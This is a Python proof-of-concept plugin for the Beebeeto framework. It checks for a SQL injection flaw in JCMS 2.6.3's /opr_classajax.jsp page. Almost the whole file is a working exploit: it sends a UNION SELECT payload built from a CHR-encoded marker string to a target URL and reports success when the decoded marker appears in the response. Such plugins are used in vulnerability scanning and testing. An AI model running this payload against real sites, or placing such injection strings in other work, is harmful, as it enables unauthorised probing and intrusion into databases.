#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        'poc': {
            'id': 'poc-2015-0118',
            'name': 'JCMS v2.6.3 /opr_classajax.jsp SQL注入漏洞 PoC',
            'author': 'kenan',
            'create_date': '2015-07-01',
        },
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        'vul': {
            'app_name': 'JCMS',
            'vul_version': ['2.6.3'],
            'type': 'SQL Injection',
            'tag': ['JCMS 2.6.3-ZZSZF[U11]', 'SQL 注入漏洞', '/opr_classajax.jsp', 'jsp'],
            'desc': '漏洞文件：/jcms/jcms_files/jcms1/web1/site/module/sitesearch/opr_classajax.jsp',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-087751',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = ("/jcms/jcms_files/jcms1/web1/site/module/sitesearch/opr_classajax.jsp?"
                   "classid=11%20UNION%20ALL%20SELECT%20NULL,CHR(113)||CHR(122)||CHR(113)"
                   "||CHR(106)||CHR(113)||CHR(78)||CHR(89)||CHR(99)||CHR(76)||CHR(117)||"
                   "CHR(72)||CHR(100)||CHR(80)||CHR(72)||CHR(107)||CHR(113)||CHR(107)||CHR"
                   "(106)||CHR(118)||CHR(113)%20FROM%20DUAL--")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if "qzqjqNYcLuHdPHkqkjvq" in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())